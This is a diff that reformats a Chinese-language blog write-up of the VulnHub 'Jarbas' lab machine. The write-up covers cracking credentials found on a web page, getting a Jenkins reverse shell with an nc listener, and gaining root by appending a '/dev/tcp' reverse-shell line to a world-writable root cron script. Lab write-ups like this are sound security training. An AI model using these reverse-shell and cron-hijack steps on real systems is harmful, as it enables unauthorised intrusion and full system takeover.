@@ -196,8 +196,8 @@ Target: http://192.168.218.191/
 [09:09:36] 403 -  210B  - /cgi-bin/               
                                                   
 Task Completed
-
 ```
+
 以防万一都扫一下
 
 只扫出来一个access.html页面看一下，好像是三组凭证，密码加密，尝试解密，我使用的[解密网站](https://hashes.com/en/decrypt/hash)，感觉还行，三个密码都破解了。">
@@ -388,8 +388,8 @@ Target: http://192.168.218.191/
 [09:09:36] 403 -  210B  - /cgi-bin/               
                                                   
 Task Completed
-
 ```
+
 以防万一都扫一下
 
 只扫出来一个access.html页面看一下，好像是三组凭证，密码加密，尝试解密，我使用的[解密网站](https://hashes.com/en/decrypt/hash)，感觉还行，三个密码都破解了。">
@@ -641,7 +641,6 @@ Target: http://192.168.218.191/
 [09:09:36] 403 -  210B  - /cgi-bin/               
                                                   
 Task Completed
-
 </code></pre>
 <p>以防万一都扫一下</p>
 <p>只扫出来一个access.html页面看一下，好像是三组凭证，密码加密，尝试解密，我使用的<a href="https://hashes.com/en/decrypt/hash" rel="nofollow">解密网站</a>，感觉还行，三个密码都破解了。但是都试了一下ssh，无法登录。</p>
@@ -656,9 +655,8 @@ eder:vipsu</p>
 登陆进来了，比较简单，构建新项目执行命令</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/19adf448-7fb0-4425-bed2-65cd50ddde16"><img width="1919" height="1040" alt="Image" src="https://github.com/user-attachments/assets/19adf448-7fb0-4425-bed2-65cd50ddde16" style="max-width: 100%; height: auto; max-height: 1040px;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e013f654-7089-436c-9538-503778bba71f"><img width="1919" height="1036" alt="Image" src="https://github.com/user-attachments/assets/e013f654-7089-436c-9538-503778bba71f" style="max-width: 100%; height: auto; max-height: 1036px;"></a></p>
-再kali上监听4444端口，拿反弹shell
-```
-┌──(kali㉿kali)-[~/…/writeup/vulnhub/jarbas/nmapScan]
+<p>再kali上监听4444端口，拿反弹shell</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/writeup/vulnhub/jarbas/nmapScan]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [192.168.218.148] from (UNKNOWN) [192.168.218.191] 52456
@@ -667,49 +665,49 @@ bash-4.2$ id
 id
 uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_t:s0
 bash-4.2$ 
-<pre class="notranslate"><code class="notranslate">## 提权
-翻找了一会，没发现提权的信息，也登录不上eder的账户，然后再找，在看定时任务的时候有发现
 </code></pre>
-<p>bash-4.2$ cat /etc/crontab<br>
-cat /etc/crontab<br>
-SHELL=/bin/bash<br>
-PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>
-MAILTO=root</p>
-<h1>For details see man 4 crontabs</h1>
-<h1>Example of job definition:</h1>
-<h1>.---------------- minute (0 - 59)</h1>
-<h1>|  .------------- hour (0 - 23)</h1>
-<h1>|  |  .---------- day of month (1 - 31)</h1>
-<h1>|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</h1>
-<h1>|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</h1>
-<h1>|  |  |  |  |</h1>
-<h1>*  *  *  *  * user-name  command to be executed</h1>
-<p>*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1<br>
-bash-4.2$ ls -la /etc/script/CleaningSce^Hript.sh<br>
-ls -la /etc/script/CleaningScript.sh<br>
--rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh</p>
-<pre class="notranslate"><code class="notranslate">并且这个脚本权限为777，那就简单了，直接追加反弹 shell 命令
-`echo "bash -i &gt;&amp; /dev/tcp/192.168.218.148/4444 0&gt;&amp;1" &gt;&gt; /etc/script/CleaningScript.sh`
+<h2>提权</h2>
+<p>翻找了一会，没发现提权的信息，也登录不上eder的账户，然后再找，在看定时任务的时候有发现</p>
+<pre class="notranslate"><code class="notranslate">bash-4.2$ cat /etc/crontab
+cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
 
-在kali上开启监听，然后等待定时任务执行，就可以提权了。
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1
+bash-4.2$ ls -la /etc/script/CleaningSce^Hript.sh
+ls -la /etc/script/CleaningScript.sh
+-rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh
 </code></pre>
-<p>┌──(kali㉿kali)-[~]<br>
-└─$ nc -lvnp 4444<br>
-listening on [any] 4444 ...<br>
-connect to [192.168.218.148] from (UNKNOWN) [192.168.218.191] 52458<br>
-bash: no job control in this shell<br>
-[root@jarbas ~]# ls<br>
-ls<br>
-flag.txt<br>
-[root@jarbas ~]# id<br>
-id<br>
-uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023<br>
-[root@jarbas ~]#</p>
-<pre class="notranslate"><code class="notranslate">好了提权成功
-
-## 反思，这个靶机比较简单，考察信息检索的能力，以及对检索到的信息的利用，以及对这些开源的服务器的漏洞利用，提权也比较简单，主要是寻找自动任务的思路。
-
-</code></pre></div>
+<p>并且这个脚本权限为777，那就简单了，直接追加反弹 shell 命令<br>
+<code class="notranslate">echo "bash -i &gt;&amp; /dev/tcp/192.168.218.148/4444 0&gt;&amp;1" &gt;&gt; /etc/script/CleaningScript.sh</code></p>
+<p>在kali上开启监听，然后等待定时任务执行，就可以提权了。</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444          
+listening on [any] 4444 ...
+connect to [192.168.218.148] from (UNKNOWN) [192.168.218.191] 52458
+bash: no job control in this shell
+[root@jarbas ~]# ls
+ls
+flag.txt
+[root@jarbas ~]# id
+id
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
+[root@jarbas ~]# 
+</code></pre>
+<p>好了提权成功</p>
+<h2>反思</h2>
+<p>这个靶机比较简单，考察信息检索的能力，以及对检索到的信息的利用，以及对这些开源的服务器的漏洞利用，提权也比较简单，主要是寻找自动任务的思路。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
